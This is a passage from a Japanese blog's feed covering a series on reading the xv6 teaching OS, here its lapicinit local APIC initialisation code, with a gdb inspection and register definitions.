&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;SEG_KCODE&lt;/code&gt;などのセグメントセレクタと、割り当てしている権限についてはブートストラップを参照したときにも確認したので、この記事では割愛します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/unix-xv6-001-bootstrap&quot;&gt;xv6OSを真面目に読みこんでカーネルを完全に理解する -ブートストラップ編-&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;カーネル側でセグメントディスクリプタの初期化を行いました。&lt;/p&gt;
&lt;p&gt;次回は&lt;code class=&quot;language-text&quot;&gt;picinit&lt;/code&gt;関数から。。。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qXYsZX&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ゼロからのOS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3JRUdI2&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;作って理解するOS x86系コンピュータを動かす理論と実装&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[xv6OSを真面目に読みこんでカーネルを完全に理解する -ローカルAPIC 編-]]></title><description><![CDATA[教育用OSのxv6OSのソースコードを読んでカーネルについて学んでいきます。この記事ではxv6OSのカーネルのmain関数の挙動を読み解きます。]]></description><link>https://kashiwaba-yuki.com/unix-xv6-007-kernel-main-04</link><guid isPermaLink="false">https://kashiwaba-yuki.com/unix-xv6-007-kernel-main-04</guid><pubDate>Wed, 02 Feb 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;にインスパイアされて&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;を読んでます。&lt;/p&gt;
&lt;p&gt;UNIX V6自体はx86CPUでは動作しないため、基本的には、UNIXv6をX86アーキテクチャで動くようにした&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;のリポジトリをForkした&lt;a href=&quot;https://github.com/kash1064/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/xv6-public: xv6 OS&lt;/a&gt;のソースコードを読んでいくことにしました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-006-kernel-main-03&quot;&gt;前回&lt;/a&gt;は&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数で実行される&lt;code class=&quot;language-text&quot;&gt;mpinit&lt;/code&gt;関数によるマルチプロセッサ構成でのCPU情報の取得を確認しました。&lt;/p&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;lapicinit&lt;/code&gt;関数の挙動を追っていきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#lapicinit%E9%96%A2%E6%95%B0&quot;&gt;lapicinit関数&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%ABapic%E3%83%AC%E3%82%B8%E3%82%B9%E3%82%BF&quot;&gt;ローカルAPICレジスタ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#spurious-interrupt-vector%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%81%A8%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%ABapic%E3%81%AE%E6%9C%89%E5%8A%B9%E5%8C%96&quot;&gt;Spurious Interrupt Vectorの設定とローカルAPICの有効化&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%BF%E3%82%A4%E3%83%9E%E3%81%AE%E8%A8%AD%E5%AE%9A&quot;&gt;タイマの設定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#disable-logical-interrupt-lines&quot;&gt;Disable logical interrupt lines&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#disable-performance-counter-overflow-interrupts&quot;&gt;Disable performance counter overflow interrupts&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#error-register%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88&quot;&gt;Error Registerのセット&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#esr%E3%81%AE%E3%82%AF%E3%83%AA%E3%82%A2&quot;&gt;ESRのクリア&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#eoi%E3%81%AE%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF&quot;&gt;EOIのチェック&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#interrupt-command-register%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88&quot;&gt;Interrupt Command Registerのセット&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;lapicinit関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#lapicinit%E9%96%A2%E6%95%B0&quot; aria-label=&quot;lapicinit関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;lapicinit関数&lt;/h2&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数で最初に実行される関数群の&lt;code class=&quot;language-text&quot;&gt;lapicinit&lt;/code&gt;関数から見ていきます。&lt;/p&gt;
&lt;p&gt;ここでは割込みコントローラの初期化を行います。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token function&quot;&gt;lapicinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;     &lt;span class=&quot;token comment&quot;&gt;// interrupt controller&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;lapicinit&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;lapic.c&lt;/code&gt;で以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;lapicinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;lapic&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Enable local APIC; set spurious interrupt vector.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;SVR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ENABLE &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;T_IRQ0 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; IRQ_SPURIOUS&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// The timer repeatedly counts down at bus frequency&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// from lapic[TICR] and then issues an interrupt.&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// If xv6 cared more about precise timekeeping,&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// TICR would be calibrated using an external time source.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TDCR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; X1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TIMER&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PERIODIC &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;T_IRQ0 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; IRQ_TIMER&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TICR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10000000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Disable logical interrupt lines.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;LINT0&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; MASKED&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;LINT1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; MASKED&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Disable performance counter overflow interrupts&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// on machines that provide that interrupt entry.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lapic&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;VER&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PCINT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; MASKED&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Map error interrupt to IRQ_ERROR.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ERROR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; T_IRQ0 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; IRQ_ERROR&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Clear error status register (requires back-to-back writes).&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ESR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ESR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Ack any outstanding interrupts.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;EOI&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Send an Init Level De-Assert to synchronise arbitration ID&apos;s.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ICRHI&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ICRLO&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; BCAST &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; INIT &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; LEVEL&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lapic&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;ICRLO&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; DELIVS&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Enable interrupts on the APIC (but not on the processor).&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TPR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;if(!lapic) return;&lt;/code&gt;ではグローバル変数&lt;code class=&quot;language-text&quot;&gt;lapic&lt;/code&gt;に値が格納されているかをチェックしています。&lt;/p&gt;
&lt;h3 id=&quot;ローカルapicレジスタ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%ABapic%E3%83%AC%E3%82%B8%E3%82%B9%E3%82%BF&quot; aria-label=&quot;ローカルapicレジスタ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ローカルAPICレジスタ&lt;/h3&gt;
&lt;p&gt;変数&lt;code class=&quot;language-text&quot;&gt;lapic&lt;/code&gt;は&lt;a href=&quot;/unix-xv6-006-kernel-main-03&quot;&gt;前回&lt;/a&gt;確認したMPテーブルの取得の中でMPフローティングポインタ内の&lt;code class=&quot;language-text&quot;&gt;lapicaddr&lt;/code&gt;のアドレスが格納されていました。&lt;/p&gt;
&lt;p&gt;実際にこのグローバル変数に格納されている値をデバッガで確認してみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ b *0x801027a0
$ &lt;span class=&quot;token builtin class-name&quot;&gt;continue&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;変数&lt;code class=&quot;language-text&quot;&gt;lapic&lt;/code&gt;の中身を見てみたところ、アドレス&lt;code class=&quot;language-text&quot;&gt;0xfee00000&lt;/code&gt;が格納されていました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ info variables lapic
File lapic.c:
&lt;span class=&quot;token number&quot;&gt;44&lt;/span&gt;:	volatile uint *lapic&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

$ p lapic
&lt;span class=&quot;token variable&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;volatile uint *&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; 0xfee00000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この&lt;code class=&quot;language-text&quot;&gt;lapic&lt;/code&gt;は、メモリマップされたローカルAPICレジスタです。&lt;/p&gt;
&lt;p&gt;ローカルAPICレジスタはMPコンフィグレーションテーブルの指すアドレスにメモリマップされた32bitのデータです。&lt;/p&gt;
&lt;p&gt;16バイト境界にアラインメントされたオフセットにある、32bitの各要素をローカルAPICレジスタとして設定します。&lt;/p&gt;
&lt;p&gt;詳細は以下のページが参考になります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/APIC&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;APIC - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以降は、ローカルAPICレジスタの設定を行っていきます。&lt;/p&gt;
&lt;p&gt;その際、&lt;code class=&quot;language-text&quot;&gt;lapic.c&lt;/code&gt;で定義された以下の値を使用します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Local APIC registers, divided by 4 for use as uint[] indices.&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ID&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0020&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// ID&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;VER&lt;/span&gt;     &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0030&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Version&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;TPR&lt;/span&gt;     &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0080&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Task Priority&lt;/span&gt;&lt;/span&gt;
